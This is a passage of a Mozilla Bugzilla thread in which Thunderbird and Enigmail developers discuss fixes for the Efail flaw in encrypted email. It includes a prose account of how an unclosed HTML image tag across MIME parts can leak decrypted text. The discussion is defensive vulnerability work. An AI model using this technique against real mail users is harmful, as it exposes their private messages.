Going down to plaintext (even if only for encrypted mail) is IMHO a little too drastic and not necessary.</pre></div><div class="change-set" id="c44"><div class="comment" data-id="13276020" data-no="44"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-44" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_100230" id="a15025959_176914"><img src="https://secure.gravatar.com/avatar/da0befc896cd73c16805f598f0e18bcb?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_100230" id="a15025959_176914"><a class="email " href="/user_profile?user_id=100230" > <span class="fna">Patrick Brunschwig</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-44"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-44" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c44">Comment 44</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-14 08:39 PDT" data-time="1526312351">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-44">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-44" data-comment-id="13276020">Ben, are you sure this would help in all cases? I suspect that you could still get a HTML tag containing hidden text which stems from a MIME part that was invisible at viewing time.</pre></div><div class="change-set" id="c45"><div class="comment" data-id="13276046" data-no="45"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-45" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15025959_176914"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_22599" id="a15025959_176914"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-45"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-45" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c45">Comment 45</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-14 08:49 PDT" data-time="1526312940">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-45">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8975520"
         class="attachment obsolete"
         data-id="8975520" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="tb-smime-leak-1.png">
      <meta itemprop="contentSize" content="94240">
      <meta itemprop="encodingFormat" content="image/png">
      <div class="label">
        Attached image
          <a class="link lightbox" href="attachment.cgi?id=8975520" itemprop="contentUrl">
        <span id="att-8975520-description" itemprop="description">tb-smime-leak-1.png</span></a> (obsolete)
        — <a href="attachment.cgi?id=8975520&amp;action=edit" itemprop="url">Details</a>
      </div>
    </div>

  
    <pre
        class="comment-text  "
        id="ct-45" data-comment-id="13276046">Screenshot, replying to attack email in HTML mode, Sanitized HTML mode and plaintext mode. Screenshot made without encryption for simplicity.

I can make a patch for that.</pre></div><div class="change-set" id="c46"><div class="comment" data-id="13276076" data-no="46"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-46" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15025959_176914"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_22599" id="a15025959_176914"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-46"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-46" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c46">Comment 46</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-14 08:55 PDT" data-time="1526313359">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-46">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8975523"
         class="attachment"
         data-id="8975523" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="tb-smime-leak-2.png">
      <meta itemprop="contentSize" content="93146">
      <meta itemprop="encodingFormat" content="image/png">
      <div class="label">
        Attached image
          <a class="link lightbox" href="attachment.cgi?id=8975523" itemprop="contentUrl">
        <span id="att-8975523-description" itemprop="description">tb-smime-leak-2.png</span></a>
        — <a href="attachment.cgi?id=8975523&amp;action=edit" itemprop="url">Details</a>
      </div>
    </div>

  
    <pre
        class="comment-text  "
        id="ct-46" data-comment-id="13276076">Sorry, labels were inverse. Fixed. Attached again. Sorry for the messup.</pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8975520&amp;action=edit"
           title="tb-smime-leak-1.png"
           class=""
        >Attachment #8975520</a> -
        Attachment is obsolete: true</div></div></div><div class="change-set" id="c47"><div class="comment" data-id="13276115" data-no="47"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-47" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15025959_176914"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_22599" id="a15025959_176914"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-47"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-47" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c47">Comment 47</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-14 09:10 PDT" data-time="1526314235">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-47">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-47" data-comment-id="13276115"><span class="quote">&gt; I suspect that you could still get a HTML tag containing hidden text which stems from a MIME part that was invisible at viewing time.</span >

I'd have to test and check that.

However, just pasting encrypted text somewhere in the body wouldn't automatically decrypt it, would it?

If I understood the attack right, it bases on tricking the user into running a URL, either as &lt;iframe&gt; or &lt;form&gt; or &lt;img&gt; or style sheet or what have you. I am fairly confident that the sanitizer neutralizes all of these URL runs, at least that was its primary design goal.</pre></div><div class="change-set" id="c48"><div class="comment" data-id="13276122" data-no="48"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-48" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_100230" id="a15025959_176914"><img src="https://secure.gravatar.com/avatar/da0befc896cd73c16805f598f0e18bcb?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_100230" id="a15025959_176914"><a class="email " href="/user_profile?user_id=100230" > <span class="fna">Patrick Brunschwig</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-48"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-48" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c48">Comment 48</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-14 09:16 PDT" data-time="1526314563">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-48">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-48" data-comment-id="13276122">(In reply to Ben Bucksch (:BenB) from <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c47">comment #47</a>)
<span class="quote">&gt; &gt; I suspect that you could still get a HTML tag containing hidden text which stems from a MIME part that was invisible at viewing time.
&gt; 
&gt; I'd have to test and check that.
&gt; 
&gt; However, just pasting encrypted text somewhere in the body wouldn't
&gt; automatically decrypt it, would it?</span >

No, that wouldn't work.

According to the Efail authors, it's apparently also possible to play tricks with mixing double and single quotes in a clever way in HTML. Is this also sanitized?</pre></div><div class="change-set" id="c49"><div class="comment" data-id="13277775" data-no="49"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-49" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15025959_176914"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_22599" id="a15025959_176914"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-49"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-49" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c49">Comment 49</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-14 21:39 PDT" data-time="1526359151">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-49">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-49" data-comment-id="13277775">Paper:
<a rel="nofollow" href="https://efail.de/">https://efail.de/</a>
<a rel="nofollow" href="https://efail.de/efail-attack-paper.pdf">https://efail.de/efail-attack-paper.pdf</a>

News:
<a rel="nofollow" href="https://www.wired.com/story/efail-encrypted-email-flaw-pgp-smime/">https://www.wired.com/story/efail-encrypted-email-flaw-pgp-smime/</a>
<a rel="nofollow" href="https://www.theregister.co.uk/2018/05/14/smime_pgp_encryption_flaw_emails_vulnerable_to_snooping/">https://www.theregister.co.uk/2018/05/14/smime_pgp_encryption_flaw_emails_vulnerable_to_snooping/</a>
<a rel="nofollow" href="https://www.washingtonpost.com/news/the-switch/wp/2018/05/14/hackers-could-be-reading-your-encrypted-emails-heres-how/?noredirect=on&amp;utm_term=.c45189fc8dce">https://www.washingtonpost.com/news/the-switch/wp/2018/05/14/hackers-could-be-reading-your-encrypted-emails-heres-how/?noredirect=on&amp;utm_term=.c45189fc8dce</a>
<a rel="nofollow" href="https://www.heise.de/security/artikel/PGP-und-S-MIME-So-funktioniert-Efail-4048873.html">https://www.heise.de/security/artikel/PGP-und-S-MIME-So-funktioniert-Efail-4048873.html</a></pre><div class="activity"><div class="change">URL: <a href="https://efail.de/" target="_blank" rel="noreferrer"
           class="bug-url" data-safe="1"
        >https://efail.de/</a></div></div></div><div class="change-set" id="c50"><div class="comment" data-id="13277782" data-no="50"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-50" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15025959_176914"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_22599" id="a15025959_176914"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-50"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-50" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c50">Comment 50</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-14 21:43 PDT" data-time="1526359403">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-50">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-50" data-comment-id="13277782">For end users, simple short-term mitigation: Enable menu View | Message Body as | Simple HTML.

That should run all HTML mail parts through the sanitizer before it hits other parts of Thunderbird and remove active URLs, at least that's the basic idea. I'll have to test each PoC to check whether one of them slips through, though.</pre></div><div class="change-set" id="c51"><div class="comment" data-id="13277854" data-no="51"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-51" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_100230" id="a15025959_176914"><img src="https://secure.gravatar.com/avatar/da0befc896cd73c16805f598f0e18bcb?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_100230" id="a15025959_176914"><a class="email " href="/user_profile?user_id=100230" > <span class="fna">Patrick Brunschwig</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-51"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-51" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c51">Comment 51</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-14 23:15 PDT" data-time="1526364921">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-51">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-51" data-comment-id="13277854">For the moment I'm recommending to use view messages as Plain text, which should prevent any remote URLs.</pre></div><div class="change-set" id="c52"><div class="comment" data-id="13277880" data-no="52"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-52" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15025959_176914"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15025959_176914"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-52"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-52" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c52">Comment 52</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-14 23:50 PDT" data-time="1526367013">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-52">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-52" data-comment-id="13277880">&quot;Remote URLs&quot;? I thought the case we're discussion here is the &quot;direct exfiltration&quot; where decrypted parts get included invisibly in the reply.</pre></div><div class="change-set" id="c53"><div class="comment" data-id="13277893" data-no="53"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-53" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_101158" id="a15025959_176914"><img src="https://secure.gravatar.com/avatar/18eb16a976feb4b40d839c5e9036bc3a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_101158" id="a15025959_176914"><a class="email " href="/user_profile?user_id=101158" > <span class="fna">Magnus Melin [:mkmelin]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-53"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-53" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c53">Comment 53</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-15 00:07 PDT" data-time="1526368069">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-53">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-53" data-comment-id="13277893">Yes that's the case for trunk/beta. But until 52.8 is out the other cases are an issue.</pre></div><div class="change-set" id="c54"><div class="comment" data-id="13278341" data-no="54"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-54" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_100230" id="a15025959_176914"><img src="https://secure.gravatar.com/avatar/da0befc896cd73c16805f598f0e18bcb?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_100230" id="a15025959_176914"><a class="email " href="/user_profile?user_id=100230" > <span class="fna">Patrick Brunschwig</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-54"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-54" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c54">Comment 54</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-15 04:23 PDT" data-time="1526383414">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-54">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-54" data-comment-id="13278341">I think that sanitizing the HTML tree for replies is a good idea.</pre></div><div class="change-set" id="c55"><div class="comment" data-id="13280588" data-no="55"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-55" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15025959_176914"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_22599" id="a15025959_176914"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-55"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-55" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c55">Comment 55</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-15 22:02 PDT" data-time="1526446973">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-55">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-55" data-comment-id="13280588">I think I have a fix.
Magnus, do you mind, if I take this?</pre></div><div class="change-set" id="c56"><div class="comment" data-id="13280596" data-no="56"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-56" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_101158" id="a15025959_176914"><img src="https://secure.gravatar.com/avatar/18eb16a976feb4b40d839c5e9036bc3a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_101158" id="a15025959_176914"><a class="email " href="/user_profile?user_id=101158" > <span class="fna">Magnus Melin [:mkmelin]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-56"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-56" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c56">Comment 56</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-15 22:11 PDT" data-time="1526447475">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-56">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-56" data-comment-id="13280596">Not at all, here you go.</pre><div class="activity"><div class="change">Assignee: mkmelin+mozilla &rarr; ben.bucksch</div><div class="change">Status: ASSIGNED &rarr; NEW</div></div></div><div class="change-set" id="c57"><div class="comment" data-id="13280623" data-no="57"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-57" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15025959_176914"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_22599" id="a15025959_176914"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-57"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-57" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c57">Comment 57</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-15 22:32 PDT" data-time="1526448746">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-57">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-57" data-comment-id="13280623">After discussing with Patrick, we both think there are several issues at work here, and that this problem needs 3 different fixes:


1. Separate MIME parts from each other

We currently output a cut-off HTML document, and concatenate that with other MIME parts, and construct a single document out of all these MIME parts. This is the cardinal bug here.

The correct solution here is to jail each MIME part into a separate &lt;iframe type=&quot;content&quot;&gt; in the UI.
However, we don't want one scrollbar for each MIME part, but one scroll for the entire body. &lt;iframe seamless&gt; would allow that, but it was never implemented in Firefox and is now dead. We might later find a workaround, but this is more work and can't be done short term.

Together, we had the idea of running the HTML document through the HTML parser. The parser will clean up the HTML and close any open tags and attributes and the serializer will output a complete HTML document. That avoids that we end the MIME part with &lt;img src=&quot; and stops this attack cold.

It's not pretty, it's slower, and it's not a perfect solution, but it should fix the bug here, and all known variants of it.


2. Sanitize quoted HTML

The composer is more vulnerable than the viewer. In the viewer, we assume malicious code and harden against it. Not so in the composer, which assumes that the user enters the data.

After all, this is just a quote/cite. We only need to preserve the essence of it, enough for a citation.

That's why we should sanitize the HTML that we quote from the original message and insert into the user's mail.

This should close a whole class of attacks that
a) attack our composer
b) attack the recipients of our user
   (which could lead to interesting constellations, esp. when it comes to decryption and trust)
So, I think this will be an important protection going forward.


3. Only decrypt, if the entire message is encrypted, not attachments

Normally, if we receive an encrypted email, the entire email will be encrypted. There's little point in leaving part of the message encrypted.

Part of the bug here was that we are automatically decrypting and inlining MIME subparts. That led to that &quot;mixed content&quot;. Patrick had no way to stop that &quot;mixed content&quot; in Enigmail, because the code is in libmime.

We should only automatically decrypt a message, if the entire message is encrypted. That's true for all normal encrypted emails.
If an attachment is encrypted, we should simply show it as external attachment. The user can click on it to open or save it.
(In the first version of the patch, I might only allow saving the attachment, not opening it directly by double-click - depending on how difficult it is to implement.)


I have a good part of this already implemented. Patches will follow.</pre></div><div class="change-set" id="c58"><div class="comment" data-id="13280624" data-no="58"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-58" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15025959_176914"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_22599" id="a15025959_176914"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-58"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-58" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c58">Comment 58</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-15 22:32 PDT" data-time="1526448760">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-58">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-58" data-comment-id="13280624">Thanks, Magnus! :-)</pre><div class="activity"><div class="change">Status: NEW &rarr; ASSIGNED</div></div></div><div class="change-set" id="c59"><div class="comment" data-id="13280695" data-no="59"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-59" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15025959_176914"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_22599" id="a15025959_176914"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-59"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-59" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c59">Comment 59</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-15 23:47 PDT" data-time="1526453226">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-59">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8976050"
         class="attachment patch obsolete"
         data-id="8976050" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="efail-composer-2.diff">
      <meta itemprop="contentSize" content="2747">
      <meta itemprop="encodingFormat" content="text/plain">
      <div class="label">
        Attached patch
          <meta itemprop="contentUrl" content="attachment.cgi?id=8976050">
          <a class="link" href="attachment.cgi?id=8976050&amp;action=diff">
        <span id="att-8976050-description" itemprop="description">Sanitize quoted HTML</span></a> (obsolete)
        — <a href="attachment.cgi?id=8976050&amp;action=edit" itemprop="url">Details</a>
          — <a href="/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976050">Splinter Review</a>
      </div>
    </div>

  
    <pre
        class="comment-text  "
        id="ct-59" data-comment-id="13280695">This is a fix for 2. Sanitize quoted HTML

I am not completely sure that I found all the necessary places to insert the code. My goal is to sanitize all foreign HTML content that's inserted into the composer, whereby &quot;foreign&quot; means anything not created by our user, anything coming from the network. If anybody knows additional places to cover, please let me know.

I've tested this by
1. setting View | Message body as | Original HTML
2. opening an Amazon HTML email
-&gt; It display with colors and &lt;table&gt; boxes and everything, in the viewer
3. Clicking Reply

Without the patch:
-&gt; The inserted quote has colors, boxes etc.

With the patch:
-&gt; The inserted quote is the sanitized HTML version,
   without colors, with broken remote images (as intended),
   basically just text, but with links etc..
   Same that you get with View | Message Body as | Simple HTML.</pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8976050&amp;action=edit"
           title="Sanitize quoted HTML"
           class=""
        >Attachment #8976050</a> -
        Flags: review?(mkmelin+mozilla)</div></div></div><div class="change-set" id="c60"><div class="comment" data-id="13280721" data-no="60"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-60" role="presentation">
      <tr>
